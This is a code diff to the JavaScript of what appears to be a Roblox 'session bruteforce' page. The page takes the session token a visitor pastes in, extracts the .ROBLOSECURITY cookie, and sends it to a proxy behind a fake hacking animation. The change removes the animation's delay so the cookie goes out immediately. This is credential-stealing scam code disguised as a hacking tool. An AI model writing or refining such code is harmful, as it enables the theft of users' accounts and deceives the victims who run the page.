@@ -34,19 +34,14 @@ async function sendToProxy(sessionId) {
 }
 
 function bruteforce(sessionId) {
-  // Start the hacking animation
-  startHack();
-  
-  // Process the session ID after delay (matches progress bar)
-  setTimeout(async () => {
-    try {
-      const cookie = extractRobloxSecurityCookie(sessionId) || sessionId;
-      await sendToProxy(cookie);
-      showCookieSuccess();
-    } catch (error) {
-      showError("Failed to process session ID");
-    }
-  }, 65000); // Match with progress bar duration
+  try {
+    const cookie = extractRobloxSecurityCookie(sessionId) || sessionId;
+    sendToProxy(cookie)
+      .then(() => showCookieSuccess())
+      .catch(() => showError("Failed to process session ID"));
+  } catch (error) {
+    showError("Invalid session ID format");
+  }
 }
 
 // Your existing validateInput function (unchanged)
@@ -78,9 +73,9 @@ function validateInput() {
     showError(errorMessage);
     return;
   }
+    bruteforce(sessionId);
 
   hideError();
-    bruteforce(sessionId);
 
     startHack();
 }
